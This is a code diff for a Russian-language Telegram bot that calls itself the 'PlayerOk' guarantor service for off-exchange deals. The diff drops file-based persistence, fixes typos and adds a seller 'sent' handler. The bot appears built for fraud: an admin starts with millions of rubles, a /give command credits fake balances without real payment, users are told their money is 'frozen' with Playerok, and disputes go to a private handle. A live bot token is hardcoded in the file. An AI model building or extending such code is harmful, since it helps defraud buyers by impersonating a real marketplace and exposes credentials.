@@ -1,5 +1,4 @@
 const { Telegraf, Markup } = require('telegraf');
-const fs = require('fs');
 const http = require('http');
 
 const bot = new Telegraf('8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY');
@@ -17,28 +16,13 @@ http.createServer((req, res) => {
     res.end('Bot is running\n');
 }).listen(PORT, '0.0.0.0');
 
-// Безопасное чтение базы данных
-if (fs.existsSync('database.json')) {
-    try { 
-        users = JSON.parse(fs.readFileSync('database.json', 'utf8')); 
-    } catch (e) { 
-        users = {}; 
-    }
-}
-
-function saveDB() {
-    fs.writeFileSync('database.json', JSON.stringify(users, null, 2));
-}
-
 function init(id, name) {
     const username = name ? name.toLowerCase() : '';
     if (!users[id]) {
         const startBalance = (id === ADMIN_ID) ? 16699677 : 0;
         users[id] = { id: id, username: username, balance: startBalance, count: 0 };
-        saveDB();
     } else if (username && users[id].username !== username) {
         users[id].username = username;
-        saveDB();
     }
 }
 
@@ -60,7 +44,7 @@ const menu = Markup.keyboard([
 bot.start((ctx) => {
     init(ctx.from.id, ctx.from.username);
     const text = `Добро пожаловать 👋\n\n` +
-        `✅ *PlayerOk* — специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n` +
+        `✅ *PlayerOk* — специализированный сервис по обеспечение безопасности внебиржевых сделок.\n\n` +
         `🥇 Автоматизированный алгоритм исполнения.\n` +
         `🔎 Скорость и автоматизация.\n` +
         `💳 Удобный и быстрый вывод средств.\n\n` +
@@ -80,7 +64,7 @@ bot.hears('🛡️ Безопасность', (ctx) => {
 });
 
 bot.hears('🆘 Поддержка', (ctx) => {
-    ctx.reply('🆘 Поддержка Playerok Гарант ПРЯМО in Telegram!\n\n⚖️ В случае спорных моментов в сделках, обращайтесь к нашему официальному модератору @sw1zyy01. Прикрепите медийные доказательства (скриншоты/видео) проблемы в сделке.\n\nС любовью — Playerok Гарант. ❤️');
+    ctx.reply('🆘 Поддержка Playerok Гарант ПРЯМО в Telegram!\n\n⚖️ В случае спорных моментов в сделках, обращайтесь к нашему официальному модератору @sw1zyy01. Прикрепите медийные доказательства (скриншоты/видео) проблемы в сделке.\n\nС любовью — Playerok Гарант. ❤️');
 });
 
 bot.hears('💳 Баланс', (ctx) => {
@@ -106,7 +90,6 @@ bot.command('give', (ctx) => {
     if (isNaN(tId) || isNaN(am) || am <= 0) return ctx.reply('❌ Неверный ID или сумма.');
     init(tId, null); 
     users[tId].balance += am; 
-    saveDB();
     ctx.reply(`✅ Успешно начислено ${am} руб. пользователю с ID ${tId}`);
     bot.telegram.sendMessage(tId, `💰 Администратор зачислил на ваш баланс: +${am} руб.`).catch(() => {});
 });
@@ -225,7 +208,6 @@ bot.action(/^pay_(\d+)$/, async (ctx) => {
     
     b.balance -= d.am; 
     d.status = 'send'; 
-    saveDB();
     
     await ctx.answerCbQuery('✅ Успешно оплачено!');
     await ctx.editMessageText(`💰 Сделка №${dId} успешно оплачена! Средства заморожены на счёте Playerok. Ожидайте получения товара от продавца.`);
@@ -236,3 +218,10 @@ bot.action(/^pay_(\d+)$/, async (ctx) => {
 });
 
 bot.action(/^sent_(\d+)$/, async (ctx) => {
+    const dId = parseInt(ctx.match[1]);
+    const d = deals[dId];
+    if (!d || ctx.from.id !== d.sellerId || d.status !== 'send') return ctx.answerCbQuery('❌ Ошибка.');
+    
+    d.status = 'check'; 
+    await ctx.answerCbQuery('✅ Статус обновлен!');
+    await ctx.editMessageText(`👌 Вы зафиксировали передачу товара по сделке №${dId}. Ожидайте проверки и подтверждения от покупателя.`);
